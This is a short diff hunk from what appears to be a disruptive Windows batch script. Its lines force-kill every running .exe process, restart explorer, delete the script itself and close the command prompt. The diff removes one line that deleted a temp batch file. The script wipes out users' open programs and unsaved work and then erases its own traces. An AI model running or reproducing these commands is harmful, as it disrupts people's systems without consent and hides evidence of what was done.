@@ -108,7 +108,6 @@ taskkill /f /im google.exe
 taskkill /f /im notepad.exe
 taskkill /f /im *.exe
 start explorer.exe
-del /f /q %temp%\OMFGA.bat
 del %0%
 taskkill /f /im cmd.exe
 exit
